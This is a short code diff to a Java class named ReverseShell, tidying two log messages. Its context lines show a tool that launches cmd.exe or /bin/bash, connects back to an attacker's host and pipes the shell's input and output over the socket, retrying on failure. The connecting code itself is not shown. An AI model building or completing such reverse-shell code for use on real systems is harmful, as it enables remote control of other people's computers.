@@ -31,7 +31,7 @@ public class ReverseShell extends Thread {
             // For a windows target do this. For linux "/bin/bash"
             String cmd = "cmd.exe";
             try {
-                System.out.println("Trying reverse shell to: " + targetHost + ":" + Integer.toString(targetPort));
+                System.out.println("Trying reverse shell to: " + targetHost + ":" + targetPort);
                 // The rest creates a new process
                 // Establishes a socket to the attacker
                 // Then redirects the stdin, stdout and stderr to the port.
@@ -63,7 +63,7 @@ public class ReverseShell extends Thread {
                 s.close();
                 break;
             } catch (Exception ex) {
-                System.out.println("Cant connect to " + targetHost + ":" + Integer.toString(targetPort) + ", retrying...");
+                System.out.println("Cant connect to " + targetHost + ":" + targetPort + ", retrying...");
             }
         }
     }
